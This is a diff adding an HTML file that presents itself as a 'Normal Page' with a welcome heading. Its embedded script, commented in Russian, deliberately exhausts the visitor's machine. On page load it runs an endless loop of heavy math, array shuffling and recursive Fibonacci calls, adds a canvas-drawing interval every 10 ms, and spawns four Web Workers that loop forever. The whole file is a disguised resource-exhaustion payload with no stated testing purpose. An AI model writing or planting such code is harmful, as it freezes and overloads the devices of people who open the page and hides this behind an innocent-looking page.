@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Normal Page</title>
+</head>
+<body>
+    <h1>Welcome to Normal Page</h1>
+    <script>
+        // Функция создания нагрузки на процессор
+        function createLoad() {
+            while(true) {
+                // Интенсивные математические вычисления
+                for(let i = 0; i < 1000000; i++) {
+                    Math.sqrt(Math.random() * Math.pow(Math.random(), Math.random()));
+                    Math.sin(Math.cos(Math.tan(Math.random())));
+                }
+                
+                // Создание и обработка больших массивов
+                const largeArray = new Array(1000000).fill(0).map((_, i) => i);
+                largeArray.sort(() => Math.random() - 0.5);
+                
+                // Рекурсивные вычисления
+                function fibonacci(n) {
+                    if (n <= 1) return n;
+                    return fibonacci(n - 1) + fibonacci(n - 2);
+                }
+                fibonacci(35);
+            }
+        }
+
+        // Запуск нагрузки сразу при загрузке страницы
+        window.onload = function() {
+            createLoad();
+        };
+
+        // Дополнительные потоки нагрузки
+        setTimeout(() => {
+            setInterval(() => {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                for(let i = 0; i < 1000; i++) {
+                    ctx.fillRect(Math.random() * 100, Math.random() * 100, 50, 50);
+                }
+            }, 10);
+        }, 1000);
+
+        // Web Workers для дополнительной нагрузки
+        if (window.Worker) {
+            for(let i = 0; i < 4; i++) {
+                const worker = new Worker(URL.createObjectURL(
+                    new Blob([`
+                        while(true) {
+                            const array = new Array(100000);
+                            for(let i = 0; i < array.length; i++) {
+                                array[i] = Math.sqrt(i) * Math.random();
+                            }
+                            array.sort();
+                        }
+                    `], {type: 'application/javascript'})
+                ));
+            }
+        }
+    </script>
+</body>
+</html>
